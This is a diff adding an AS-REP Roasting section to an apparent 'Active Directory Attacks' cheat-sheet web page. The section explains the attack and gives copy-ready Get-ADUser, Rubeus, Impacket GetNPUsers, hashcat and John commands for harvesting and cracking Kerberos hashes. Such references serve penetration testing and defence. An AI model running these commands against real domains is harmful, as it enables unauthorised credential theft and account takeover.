@@ -87,10 +87,79 @@
       <h1>Active Directory Attacks</h1>
 
     </div>
+<div class="section">
+  <h2>AS-REP Roasting</h2>
 
-    <div class="section">
-      <h2>AS-REP Roasting</h2>
-    </div>
+  <p>
+    AS-REP Roasting abuses Kerberos accounts that do not require pre-authentication.
+    An attacker can request authentication data and receive a response encrypted
+    with the user’s password hash, which can be cracked offline.
+  </p>
+
+  <p>
+    This attack does not require valid credentials. It only depends on the target
+    account having Kerberos pre-authentication disabled.
+  </p>
+
+  <h3>How AS-REP Roasting Works</h3>
+  <p>
+    The attacker requests an AS-REP message for a vulnerable user. The response
+    contains encrypted data derived from the user’s password, allowing offline
+    brute-force attacks without interacting further with the domain.
+  </p>
+
+  <h3>Find Users Without Pre-Authentication</h3>
+  <p>
+    Enumerates domain users configured without Kerberos pre-authentication, making
+    them vulnerable to AS-REP Roasting.
+  </p>
+
+  <pre><code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth</code>
+  <button class="copy-btn" data-copy='Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth'>COPY</button>
+  </pre>
+
+  <h3>AS-REP Roasting with Rubeus</h3>
+  <p>
+    Requests AS-REP responses for vulnerable users directly from the domain controller
+    and outputs crackable hashes.
+  </p>
+
+  <pre><code>Rubeus.exe asreproast</code>
+  <button class="copy-btn" data-copy="Rubeus.exe asreproast">COPY</button>
+  </pre>
+
+  <pre><code>Rubeus.exe asreproast /nowrap</code>
+  <button class="copy-btn" data-copy="Rubeus.exe asreproast /nowrap">COPY</button>
+  </pre>
+
+  <h3>AS-REP Roasting with Impacket</h3>
+  <p>
+    Extracts AS-REP hashes remotely using Impacket, commonly from a Kali Linux system.
+  </p>
+
+  <pre><code>impacket-GetNPUsers -dc-ip $dc-ip -request -outputfile hashes.txt domain.com/user</code>
+  <button class="copy-btn" data-copy="impacket-GetNPUsers -dc-ip $dc-ip -request -outputfile hashes.txt domain.com/user">COPY</button>
+  </pre>
+
+  <pre><code>GetNPUsers.py domain/user:password@$dc-ip -no-pass</code>
+  <button class="copy-btn" data-copy="GetNPUsers.py domain/user:password@$dc-ip -no-pass">COPY</button>
+  </pre>
+
+  <h3>Crack AS-REP Hashes</h3>
+  <p>
+    Performs offline password cracking against extracted AS-REP hashes using common
+    wordlists.
+  </p>
+
+  <pre><code>hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt</code>
+  <button class="copy-btn" data-copy="hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt">COPY</button>
+  </pre>
+
+  <pre><code>john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>
+<button class="copy-btn" data-copy="john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt">COPY</button>
+</pre>
+</div>
+
 
     <div class="section">
       <h2>Kerberoasting</h2>
